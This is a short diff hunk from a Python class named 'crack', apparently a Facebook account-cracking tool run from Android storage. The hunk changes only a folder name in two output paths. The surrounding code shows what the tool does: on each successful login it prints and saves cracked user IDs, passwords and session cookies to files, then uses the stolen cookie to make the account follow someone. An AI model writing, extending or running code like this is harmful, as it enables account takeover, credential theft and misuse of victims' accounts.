@@ -710,8 +710,8 @@ class crack:
                     user=cok['c_user']
                     print(f"\r{HH}[OK-GSXD] {user} | {pw} {VV} ")
                     #print(f"\r{HH}#[OK-GSXD] {user} | {pw} | {coki}		 {VV}			    ")
-                    open("/sdcard/GS-2X-IDS/M1- IDS/M1-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
-                    open("/sdcard/GS-2X-IDS/M1- IDS/M1-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
+                    open("/sdcard/GS-2X-IDS/M-1 IDS/M1-GSXD_OK.TXT", "a").write(used + "|" + pw + "\n")
+                    open("/sdcard/GS-2X-IDS/M-1 IDS/M1-GSXD_COKIE.TXT", "a").write(used + "	|	" + pw + " 	| 	" + cokie + 																	"			\n")
                     ok.append(user + pw)
                     self.follow(coki)
                     break
